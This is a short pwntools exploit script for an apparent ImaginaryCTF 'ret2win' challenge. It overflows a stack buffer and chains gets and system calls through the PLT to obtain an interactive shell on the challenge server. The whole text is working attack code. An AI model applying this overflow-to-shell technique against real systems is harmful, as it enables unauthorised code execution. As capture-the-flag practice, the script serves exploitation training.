from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = elf.process()
p = remote("ret2win.chal.imaginaryctf.org", 1337)

# gdb.attach(p,'''
#     init-gef
#     b *0x0000000000401050
#     c  
# ''')

# print(elf.sym)

payload = b"a"*72 + p64(elf.plt.gets) + p64(elf.plt.system)
p.sendline(payload)

p.sendline(b"/bin0sh\x00")

p.interactive()